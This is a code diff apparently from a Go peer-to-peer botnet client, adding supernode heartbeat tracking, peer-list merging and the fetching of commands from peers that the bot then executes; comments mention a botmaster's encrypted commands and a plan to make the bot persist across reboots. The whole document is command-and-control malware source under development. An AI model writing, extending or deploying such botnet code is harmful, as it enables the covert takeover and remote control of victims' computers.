@@ -28,6 +28,7 @@ type Bot struct {
 }
 
 type Online struct {
+	IP           string         `json:"ip"`
 	Command      string         `json:"command"`
 	Supernodes   map[string]int `json:"supernodes"`
 }
@@ -35,8 +36,9 @@ type Online struct {
 func main() {
 	//Public key used to decrypt a command sent from botmaster encrypted with private key
 	//Execute Command
-	//HeartBeat, remove if 3 missed
-	//Turn of http after 15 minutes if not supernode
+	//Turn off http after 15 minutes if not supernode
+	//Make persistable across reboots
+
 	bot := Bot{
 		Port:         ":8080",
 		Command:      "",
@@ -59,8 +61,11 @@ func(b *Bot)Supernode() {
 	http.HandleFunc("/Online", func(w http.ResponseWriter, r *http.Request) {
 		b.IP, _, _ = net.SplitHostPort(r.URL.Host)
 		ip, _, _ := net.SplitHostPort(r.RemoteAddr)
-		b.Supernodes[ip] = 0
+		if _, value := b.Supernodes[ip]; !value {
+			b.Supernodes[ip] = 0
+		}
 		respBody := Online{
+			IP:         ip,
 			Command:    b.Command,
 			Supernodes: b.Supernodes,
 		}
@@ -74,15 +79,25 @@ func(b *Bot)Supernode() {
 func(bot *Bot)Online() {
 	for {
 		for supernode, heartbeat := range bot.Supernodes {
-			resp, err := http.Get(supernode + bot.Port + "/Online")
-			if err != nil {
-				panic(err)
+			resp, _ := http.Get(supernode + bot.Port + "/Online")
+			if resp.StatusCode != 200 {
+				if heartbeat == 2 {
+					delete(bot.Supernodes, supernode)
+				} else {
+					bot.Supernodes[supernode] = heartbeat + 1
+				}
+			} else {
+				var respBody Online
+				json.NewDecoder(resp.Body).Decode(&respBody)
+				bot.IP = respBody.IP
+				bot.Command = respBody.Command
+				for newNode, newHeartbeat := range respBody.Supernodes {
+					if _, value := bot.Supernodes[newNode]; !value {
+						bot.Supernodes[newNode] = newHeartbeat
+					}
+				}
+				resp.Body.Close()
 			}
-			var respBody Online
-			json.NewDecoder(resp.Body).Decode(&respBody)
-			bot.Command = respBody.Command
-			bot.Supernodes = append(bot.Supernodes, respBody["supernodes"]...)
-			resp.Body.Close()
 		}
 		bot.InvokeCommand()
 		<-bot.OnlineTicker.C
